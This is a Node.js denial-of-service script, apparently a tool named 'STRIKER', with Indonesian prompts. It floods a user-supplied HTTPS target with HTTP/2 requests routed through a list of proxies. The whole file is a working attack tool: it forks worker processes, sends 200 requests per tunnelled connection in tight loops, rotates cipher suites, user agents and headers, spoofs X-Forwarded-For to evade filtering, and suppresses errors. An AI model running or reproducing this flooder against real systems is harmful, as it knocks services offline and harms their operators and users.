const chalk = require('chalk');
const gradient = require('gradient-string');
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const net = require('net');
const cluster = require('cluster');
const fakeua = require('fake-useragent');

const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];
const lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
];
const encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
];
const controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
];
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    //console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    //console.warn(e);
}).setMaxListeners(0);

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function askQuestion(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

async function main() {
    const gradientBanner = gradient(['lightblue', 'cyan', 'purple'])`

                   ___   ___                   
 _____ _____ _____|  _|_|_  |_____ _____ _____ 
|   __|_   _| __  | |_| |_| |  |  |   __| __  |
|__   | | | |    -| |_   _| |    -|   __|    -| 
|_____| |_| |__|__| |_|_|_| |__|__|_____|__|__|
                  |___| |___|                  
───────────────────────────────────────────────
[ STRIKER - 0.24_DEMO ] --------
[ ADJIDEV - ARCHISO ] -------
[ LOW POWER MODE ] ------
    `;

    console.log(gradientBanner);

    const target = await askQuestion('Targetnya (berawalan https://xxx.com)\n>');
    const time = parseInt(await askQuestion('Durasinya berapa\n>'), 10);
    const thread = parseInt(await askQuestion('Threadnya berapa>\n>'), 10);
    const proxyFile = await askQuestion('Ketik proxy.txt\n>');
 
    rl.close();

    const proxys = fs.readFileSync(proxyFile, 'utf-8').toString().match(/\S+/g);

    function accept() {
        return accept_header[Math.floor(Math.random() * accept_header.length)];
    }

    function lang() {
        return lang_header[Math.floor(Math.random() * lang_header.length)];
    }

    function encoding() {
        return encoding_header[Math.floor(Math.random() * encoding_header.length)];
    }

    function controling() {
        return controle_header[Math.floor(Math.random() * controle_header.length)];
    }

    function cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    }

    function proxyr() {
        return proxys[Math.floor(Math.random() * proxys.length)];
    }

    if (cluster.isMaster) {
        console.log(`IP PALSU SEDANG MENYERANG HARAP PAKE WIFI SUPER CEPAT!!`);

        for (let bb = 0; bb < thread; bb++) {
            cluster.fork();
        }

        setTimeout(() => {
            process.exit(-1);
        }, time * 1000);

    } else {
        function flood() {
            const parsed = url.parse(target);
            const uas = fakeua();
            const cipper = cipher();
            const proxy = proxyr().split(':');

            const header = {
                ":path": parsed.path,
                "X-Forwarded-For": proxy[0],
                "X-Forwarded-Host": proxy[0],
                ":method": "GET",
                "User-agent": uas,
                "Origin": target,
                "Accept": accept(),
                "Accept-Encoding": encoding(),
                "Accept-Language": lang(),
                "Cache-Control": controling(),
            };

            const agent = new http.Agent({
                keepAlive: true,
                keepAliveMsecs: 20000,
                maxSockets: 0,
            });

            const req = http.request({
                host: proxy[0],
                agent: agent,
                globalAgent: agent,
                port: proxy[1],
                headers: {
                    'Host': parsed.host,
                    'Proxy-Connection': 'Keep-Alive',
                    'Connection': 'Keep-Alive',
                },
                method: 'CONNECT',
                path: parsed.host + ':443'
            }, function () {
                req.setSocketKeepAlive(true);
            });

            req.on('connect', function (res, socket, head) {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tls.connect({
                        host: parsed.host,
                        ciphers: cipper,
                        secureProtocol: 'TLS_method',
                        TLS_MIN_VERSION: '1.2',
                        TLS_MAX_VERSION: '1.3',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        ALPNProtocols: ['h2'],
                        socket: socket
                    }, function () {
                        for (let i = 0; i < 200; i++) {
                            const req = client.request(header);
                            req.setEncoding('utf8');

                            req.on('data', (chunk) => {
                                // data += chunk;
                            });
                            req.on("response", (headers, flags) => {
                                console.log(`${headers[':status']}`);
                                req.close();
                            });
                            req.end();
                        }
                    })
                });
            });

            req.end();
        }

        setInterval(() => { flood() });
        setInterval(() => { flood() });
    }
}

main();
